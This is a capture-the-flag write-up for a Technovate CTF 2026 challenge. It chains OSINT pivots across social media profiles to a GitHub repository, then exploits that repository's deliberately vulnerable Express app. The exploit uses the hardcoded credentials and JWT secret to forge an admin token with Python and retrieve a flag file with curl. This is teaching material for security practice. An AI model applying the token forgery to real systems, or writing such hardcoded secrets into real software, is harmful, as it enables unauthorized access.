**Reddit Post:** https://www.reddit.com/r/securityCTF/comments/1sabqvh/comment/odvnh7s/?context=3

**Event:** Technovate CTF 2026

**Event URL:** https://technovate.ctfd.io/ & https://unstop.com/competitions/technovate-ctf-dy-patil-ramrao-adik-institute-of-technology-rait-navi-mumbai-1660710

**Challenge Name:** Unknown

**Challenge Text:** 

I Need Your Help

An alien has infiltrated human society and is attempting to blend in by stealing human identities. It has already begun leaving traces online, posting reviews, maintaining social media accounts, and pretending to live a normal digital life. While investigating unusual activity linked to my own identity, I discovered that the entity is active on Social Media Platform as mopy456345.

Your task is to track this entity’s digital footprint, uncover where it is hiding, and follow the trail it leaves behind.

its already learned trickery. Be careful, the alien is learning fast.

You will need TCHNVTE somewhere else

**TLDR Solve:**

1. Start with the X account `mopy456345`
2. Reverse image search the mountain photo
3. Identify the mountain as **Mt. Everest**
4. Interpret “hardest part” as the **Hillary Step**
5. Pivot into Google Maps reviews for the Hillary Step
6. Find Google Maps user `Dimitriusxiii`
7. Extract Instagram handle `malien442`
8. Follow Instagram to LinkedIn
9. Follow LinkedIn to GitHub user `iamalien442-star`
10. Find encoded mini-flag in `project_starfall`
11. Use clue `TCHNVTE` as a **Vigenère key**
12. Decode:
    - `MEOAQMI{13m_Ol_90_UjF3}`
    - to `TCHNVTE{13t_Me_90_HoM3}`
13. Analyze the Node/Express application in the same repo
14. Identify:
    - hardcoded user credentials
    - hardcoded JWT signing key
    - admin authorization based on `role` claim
15. Extract the real secret from `middleware/auth.js`:
    - `super_secret_ctf_key`
16. Forge a valid JWT for `user1` with `role: "admin"`
17. Send a **POST** request to `/api/admin/export`
18. Download `reward.png`
19. Recover the final flag:
    - `CTF{w3b_3nd_crypt0_st4rt}`

**Full Solve:** 

This challenge had two connected parts:

1. an **OSINT trail** used to track the alien’s online footprint across multiple platforms and recover an encoded mini-flag
2. a **web exploitation** phase involving a vulnerable Node/Express application where the goal was to gain admin access and retrieve the final flag

The challenge description included an especially important clue:

> You will need **TCHNVTE** somewhere else

That clue ended up being the key to decoding the first flag.

---

## Part 1 — OSINT Trail

### Starting point: X account

I used the username search utility from [aware-online](https://www.aware-online.com/en/osint-tools/username-search-tool/)to locate the first instance of `mopy456345` which led me to the X profile below.

- `https://x.com/mopy456345/status/2027709523314806800`

The post contained a mountain photo and the caption:

> "view was nice although the one of the hardest part gave me some trouble but still worthy of a good review"

That strongly suggested:
- “hardest part” was a clue to a specific landmark or feature

---

## Step 1 — Identify the mountain

A reverse image search identified the photo as **Mt. Everest**.

From there, the caption hint about “one of the hardest part” pointed to the **Hillary Step**, one of the most famous technically difficult sections on Everest.

---

## Step 2 — Pivot to Google Maps

Searching for Mt. Everest on Google Maps shows the following :

- Mt. Everest Google Maps Entry: [Link](https://www.google.com/maps/place/Mt+Everest/@27.988175,86.915067,3839m/data=!3m2!1e3!4b1!4m6!3m5!1s0x39e854a215bd9ebd:0x576dcf806abbab2!8m2!3d27.9881569!4d86.9253667!16zL20vMGJsYmQ?entry=ttu&g_ep=EgoyMDI2MDMzMC4wIKXMDSoASAFQAw%3D%3D)

![[mt-everest-1.png]]

From the Hillary Step reviews sorting by newest, I found a user profile **Dimitriusxiii**:

- Review: [Link](https://www.google.com/maps/place/Hillary+Step/@27.9854162,86.9234185,2283m/data=!3m1!1e3!4m16!1m7!3m6!1s0x39e854a215bd9ebd:0x576dcf806abbab2!2sMt+Everest!8m2!3d27.9881569!4d86.9253667!16zL20vMGJsYmQ!3m7!1s0x39e8549fb4c02fe5:0x203e089fe5bb1137!8m2!3d27.9870895!4d86.925641!9m1!1b1!16s%2Fg%2F1230v1kj?entry=ttu&g_ep=EgoyMDI2MDMzMC4wIKXMDSoASAFQAw%3D%3D)

This was the next pivot point.

![[mt-everest-2.png]]

---

## Step 3 — Pivot to Instagram

Reviewing the Google Maps activity for `Dimitriusxiii` revealed an Instagram handle:

- `malien442`

That led to:

- [https://www.instagram.com/malien442](https://www.instagram.com/malien442)

---

## Step 4 — Pivot to LinkedIn

The Instagram bio pointed to a LinkedIn profile:

- [www.linkedin.com/in/iamalien-et-3a31003b4/](www.linkedin.com/in/iamalien-et-3a31003b4/)
  
The LinkedIn page included a “check out my projects here” type of reference and exposed the username:

- `iamalien442-star`

That felt like a GitHub username or a project repository.

---

## Step 5 — Pivot to GitHub

Searching GitHub for that username led to:

- `https://github.com/iamalien442-star`

The relevant repository was:

- `project_starfall`

Inside the repository I found an encoded mini-flag:

- `MEOAQMI{13m_Ol_90_UjF3}`
## Step 6 — Decode the mini-flag

At this point, the earlier clue became important:

- `TCHNVTE`

The challenge had explicitly said that I would need it “somewhere else,” so I treated it as a likely crypto key. The encoded string looked like a classical cipher. Using **Vigenère decryption** with the key: `TCHNVTE`

- `MEOAQMI{13m_Ol_90_UjF3}`
- `TCHNVTE{13t_Me_90_HoM3}`
  
![[cyber-chef-1.png]]

That completed the first half of the challenge.

# Part 2 — Web / JWT Privilege Escalation

After following the OSINT trail into GitHub, the second phase involved analyzing the repository’s web application and gaining admin access.

The relevant files were:

- `server.js`
- `routes/auth.js`
- `routes/user.js`
- `routes/admin.js`
- `middleware/auth.js`

## Step 7 — Review the application routes

From `server.js`, the application exposed three route groups:

```JavaScript
app.use('/api/auth', authRoutes);        
app.use('/api/user', userRoutes);      
app.use('/api/admin', adminRoutes); 
```

So the key surfaces were:

- `/api/auth`
- `/api/user`
- `/api/admin`
## Step 8 — Review login logic

In `routes/auth.js`, the app defined a hardcoded user:

```JavaScript
const users = {  
  "user1": { password: "password123", role: "user" }  
};

This immediately gave valid credentials:

- **username:** `user1`
- **password:** `password123`

The login route then signed a JWT containing both `username` and `role`:
```

This immediately gave valid credentials:

- **username:** `user1`
- **password:** `password123`

The login route then signed a JWT containing both `username` and `role`:

```JavaScript
const payload = {  
  username: username,  
  role: user.role  
};  
  
const token = jwt.sign(payload, SECRET_KEY, { expiresIn: '2h' });
```

That was the first major red flag: the application was trusting a JWT claim to carry authorization state.
## Step 9 — Review authorization logic

### User route

In `routes/user.js`, the profile endpoint checked whether the token’s `username` matched the requested profile ID:

```JavaScript
if (req.user.username !== requestedId) {  
  return res.status(403).json({   
    error: 'Forbidden: You can only access your own profile',  
    hint: 'Different roles have different access levels'  
  });  
}```

This confirmed that the server trusted the JWT payload directly.
### Admin route

In `routes/admin.js`, the protected admin endpoint looked like this:

```JavaScript
router.post('/export', authMiddleware, (req, res) => {  
  if (req.user.role !== "admin") {  
    return res.status(403).json({ error: "Forbidden: Admin access required" });  
  }  
  
  const filePath = path.join(__dirname, "../data/reward.png");  
  
  res.download(  
    filePath,  
    "reward.png",  
    (err) => {  
      if (err) {  
        res.status(404).json({ error: "Reward file not found on server." });  
      }  
    }  
  );  
});
```

This revealed three critical things:

1. the target route was **POST** `/api/admin/export`
2. access was granted purely based on `req.user.role === "admin"`
3. successful access would download a file named `reward.png`

So the intended path was clear:

- get a valid JWT
- forge the role claim to `admin`
- call `/api/admin/export`
- retrieve the file
## Step 10 — Find the real JWT secret

Initially, the clue string `TCHNVTE` seemed like a possible JWT secret, but signing a token with it resulted in:

`Unauthorized: Invalid token`

That meant the signature was wrong, so I checked the actual middleware source.

In `middleware/auth.js`:

```JavaScript
const SECRET_KEY = "super_secret_ctf_key";
``` 

and the middleware verified tokens like this:

```JavaScript
const decoded = jwt.verify(token, SECRET_KEY);  
req.user = decoded;
``` 

So the actual JWT signing key was:

`super_secret_ctf_key`

At that point, the exploit path was confirmed.
## Vulnerability analysis

The web portion of the challenge relied on several intentional weaknesses:
### 1. Hardcoded credentials

The app shipped with a known account:

- `user1`
- `password123`
### 2. Hardcoded JWT secret

The signing key was embedded directly in source code:

```JavaScript
const SECRET_KEY = "super_secret_ctf_key";
```
### 3. Authorization based on JWT claims

The application trusted `req.user.role` from the token itself:

```JavaScript
if (req.user.role !== "admin")
```

No server-side lookup was performed after the token was verified. That means anyone who knows the signing key can mint arbitrary roles.

This is a classic JWT privilege escalation pattern.
## Step 11 — Forge an admin token

A legitimate token for `user1` contained claims like:

```JSON
{  
  "username": "user1",  
  "role": "user",  
  "iat": 1775140716,  
  "exp": 1775147916  
}
```

To escalate privileges, I generated a new token with the same structure but changed the role to `admin`.
### Python token forgery

```Python
import time  
import jwt  
  
secret = "super_secret_ctf_key"  
now = int(time.time())  
  
payload = {  
    "username": "user1",  
    "role": "admin",  
    "iat": now,  
    "exp": now + 7200  
}  
  
token = jwt.encode(payload, secret, algorithm="HS256")  
print(token)
```

This produced a valid JWT signed with the correct secret.
## Step 12 — Validate token behavior

A useful debugging detail during this phase:

- `401 Unauthorized: Invalid token` meant the JWT signature was wrong
- `403 Forbidden: You can only access your own profile` meant the JWT was valid, but the `username` claim did not match the requested `id`
- `403 Forbidden: Admin access required` meant the JWT was valid, but the `role` claim was not `admin`

That made it easy to distinguish signing failures from claim/alignment problems.

## Step 13 — Retrieve the protected file

The export route only accepted **POST**, so the correct request was:
### cURL 

```Bash
curl -X POST 'http://localhost:3000/api/admin/export' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzc1MTQwNzE2LCJleHAiOjE3NzUxNDc5MTZ9.FSqm-j08seosliyiI6cLhfWbneiPCSIqLLyc_1lE-rU' -o reward.png
```

This successfully downloaded:

- `reward.png`

The existence of the PNG was explicitly shown in the route code:

```JavaScript
const filePath = path.join(__dirname, "../data/reward.png");  
res.download(filePath, "reward.png", ...)
```

## Step 14 — Recover the final flag

Opening `reward.png` revealed the final flag:

- `CTF{w3b_3nd_crypt0_st4rt}`
  
![[flag.png]]
